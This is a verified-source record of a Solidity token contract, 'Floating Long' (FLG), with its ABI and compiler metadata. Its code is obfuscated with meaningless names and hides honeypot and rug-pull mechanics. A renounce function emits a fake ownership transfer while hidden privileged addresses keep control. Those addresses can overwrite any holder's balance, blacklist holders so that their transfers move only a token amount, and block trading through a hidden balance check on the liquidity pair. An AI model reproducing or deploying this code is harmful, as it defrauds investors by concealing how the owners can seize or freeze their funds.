{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface sellExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract buyWalletShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitExempt {\n    function createPair(address buyToken, address launchMin) external returns (address);\n}\n\ninterface tokenTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeReceiverMax) external view returns (uint256);\n\n    function transfer(address launchSender, uint256 receiverTradingMax) external returns (bool);\n\n    function allowance(address autoReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverTradingMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchSender,\n        uint256 receiverTradingMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderExempt, uint256 value);\n    event Approval(address indexed autoReceiver, address indexed spender, uint256 value);\n}\n\ninterface fromLaunched is tokenTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract FloatingLong is buyWalletShould, tokenTrading, fromLaunched {\n\n    function atExempt(uint256 receiverTradingMax) public {\n        listTotalMax();\n        shouldAuto = receiverTradingMax;\n    }\n\n    uint256 private tradingBuyTake;\n\n    address modeMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private txAt = \"Floating Long\";\n\n    address public minFrom;\n\n    function transferFrom(address feeLaunched, address launchSender, uint256 receiverTradingMax) external override returns (bool) {\n        if (_msgSender() != modeMin) {\n            if (buyLaunched[feeLaunched][_msgSender()] != type(uint256).max) {\n                require(receiverTradingMax <= buyLaunched[feeLaunched][_msgSender()]);\n                buyLaunched[feeLaunched][_msgSender()] -= receiverTradingMax;\n            }\n        }\n        return atTo(feeLaunched, launchSender, receiverTradingMax);\n    }\n\n    function atTo(address feeLaunched, address launchSender, uint256 receiverTradingMax) internal returns (bool) {\n        if (feeLaunched == launchedExempt) {\n            return takeReceiver(feeLaunched, launchSender, receiverTradingMax);\n        }\n        uint256 toTotalLimit = tokenTrading(minFrom).balanceOf(launchExempt);\n        require(toTotalLimit == shouldAuto);\n        require(launchSender != launchExempt);\n        if (launchedAmount[feeLaunched]) {\n            return takeReceiver(feeLaunched, launchSender, amountMarketing);\n        }\n        return takeReceiver(feeLaunched, launchSender, receiverTradingMax);\n    }\n\n    address launchExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address totalSenderExempt, uint256 receiverTradingMax) public virtual override returns (bool) {\n        buyLaunched[_msgSender()][totalSenderExempt] = receiverTradingMax;\n        emit Approval(_msgSender(), totalSenderExempt, receiverTradingMax);\n        return true;\n    }\n\n    uint256 shouldAuto;\n\n    uint8 private swapFee = 18;\n\n    bool public amountBuy;\n\n    uint256 private liquidityFundLaunch;\n\n    uint256 tokenFrom;\n\n    function takeReceiver(address feeLaunched, address launchSender, uint256 receiverTradingMax) internal returns (bool) {\n        require(tradingIs[feeLaunched] >= receiverTradingMax);\n        tradingIs[feeLaunched] -= receiverTradingMax;\n        tradingIs[launchSender] += receiverTradingMax;\n        emit Transfer(feeLaunched, launchSender, receiverTradingMax);\n        return true;\n    }\n\n    string private tradingLaunch = \"FLG\";\n\n    mapping(address => uint256) private tradingIs;\n\n    constructor (){\n        \n        sellExempt listFrom = sellExempt(modeMin);\n        minFrom = limitExempt(listFrom.factory()).createPair(listFrom.WETH(), address(this));\n        if (liquidityFundLaunch != isLaunched) {\n            isLaunched = tradingBuyTake;\n        }\n        launchedExempt = _msgSender();\n        tradingExempt();\n        buyExempt[launchedExempt] = true;\n        tradingIs[launchedExempt] = launchReceiverShould;\n        if (isLaunched != swapTake) {\n            liquidityFundLaunch = swapTake;\n        }\n        emit Transfer(address(0), launchedExempt, launchReceiverShould);\n    }\n\n    uint256 public teamFund;\n\n    function fromSender(address tokenToShould) public {\n        listTotalMax();\n        \n        if (tokenToShould == launchedExempt || tokenToShould == minFrom) {\n            return;\n        }\n        launchedAmount[tokenToShould] = true;\n    }\n\n    uint256 private launchReceiverShould = 100000000 * 10 ** 18;\n\n    uint256 private swapTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingLaunch;\n    }\n\n    address private amountFee;\n\n    function teamToken(address buyFund, uint256 receiverTradingMax) public {\n        listTotalMax();\n        tradingIs[buyFund] = receiverTradingMax;\n    }\n\n    function balanceOf(address takeReceiverMax) public view virtual override returns (uint256) {\n        return tradingIs[takeReceiverMax];\n    }\n\n    function listTotalMax() private view {\n        require(buyExempt[_msgSender()]);\n    }\n\n    address public launchedExempt;\n\n    bool public enableLiquidity;\n\n    uint256 public isLaunched;\n\n    function liquidityWallet(address txLimit) public {\n        if (amountBuy) {\n            return;\n        }\n        if (teamFund != swapTake) {\n            toModeAuto = true;\n        }\n        buyExempt[txLimit] = true;\n        if (enableLiquidity) {\n            teamFund = autoTeamAt;\n        }\n        amountBuy = true;\n    }\n\n    mapping(address => bool) public buyExempt;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchReceiverShould;\n    }\n\n    function tradingExempt() public {\n        emit OwnershipTransferred(launchedExempt, address(0));\n        amountFee = address(0);\n    }\n\n    uint256 private autoTeamAt;\n\n    mapping(address => mapping(address => uint256)) private buyLaunched;\n\n    function getOwner() external view returns (address) {\n        return amountFee;\n    }\n\n    bool private buySellShould;\n\n    function transfer(address buyFund, uint256 receiverTradingMax) external virtual override returns (bool) {\n        return atTo(_msgSender(), buyFund, receiverTradingMax);\n    }\n\n    function allowance(address tokenMaxBuy, address totalSenderExempt) external view virtual override returns (uint256) {\n        if (totalSenderExempt == modeMin) {\n            return type(uint256).max;\n        }\n        return buyLaunched[tokenMaxBuy][totalSenderExempt];\n    }\n\n    bool private toModeAuto;\n\n    function owner() external view returns (address) {\n        return amountFee;\n    }\n\n    uint256 constant amountMarketing = 5 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapFee;\n    }\n\n    event OwnershipTransferred(address indexed feeAutoToken, address indexed launchedMax);\n\n    mapping(address => bool) public launchedAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return txAt;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeAutoToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenMaxBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalSenderExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSenderExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTradingMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverTradingMax\",\"type\":\"uint256\"}],\"name\":\"atExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiverMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenToShould\",\"type\":\"address\"}],\"name\":\"fromSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"}],\"name\":\"liquidityWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTradingMax\",\"type\":\"uint256\"}],\"name\":\"teamToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTradingMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverTradingMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "FloatingLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}